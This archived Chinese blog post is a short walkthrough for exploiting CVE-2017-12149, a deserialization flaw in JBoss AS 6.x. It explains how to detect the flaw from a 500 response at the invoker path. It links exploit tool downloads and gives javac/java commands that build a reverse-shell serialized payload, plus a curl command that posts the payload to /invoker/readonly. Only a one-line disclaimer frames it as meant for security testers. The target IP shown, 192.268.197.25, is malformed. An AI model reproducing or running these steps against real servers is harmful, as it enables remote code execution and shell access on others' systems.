# CVE-2017-12149 JBOOS AS 6.X 反序列化漏洞利用 - sevck - 博客园

> 原文：[`www.cnblogs.com/sevck/p/7874438.html`](https://www.cnblogs.com/sevck/p/7874438.html)

检测目录： 

![](img/672923b81b5e3e365120c64279f6e04a.png)

返回 500 一般就是存在了。

下载工具：

http://scan.javasec.cn/java/JavaDeserH2HC.zip

使用方法:

```
javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java
```

```
java -cp .:commons-collections-3.2.1.jar  ReverseShellCommonsCollectionsHashMap ip:port //反弹 shell 的 IP 和端口
```

这个时候会生成一个 ReverseShellCommonsCollectionsHashMap.ser 文件，curl 这个二进制文件就可以了。

ReverseShellCommonsCollectionsHashMap.ser 打包到 http://scan.javasec.cn/java/ReverseShellCommonsCollectionsHashMap.ser

```
curl http://192.268.197.25:8080/invoker/readonly --data-binary @ReverseShellCommonsCollectionsHashMap.ser
```

监听：

![](img/fc01dccf83029a84507b67a624207c8f.png)

发送 payload:

![](img/97f466721a62ba872b32fe2cab03f30c.png)

服务器 log:

![](img/6717742c2476bcab72aa7cdd52d4e899.png)

反弹结果：

![](img/851a81fa1c1406b37824f41dac071e7b.png)

工具：

下载地址：http://scan.javasec.cn/java/jboss_CVE-2017-12149.zip   (使用本工具仅供安全从业人人员测试验证、使用请遵守中华人民共和国网络安全法)

![](img/820dd69642e17216064f67fa1a663685.png)

done.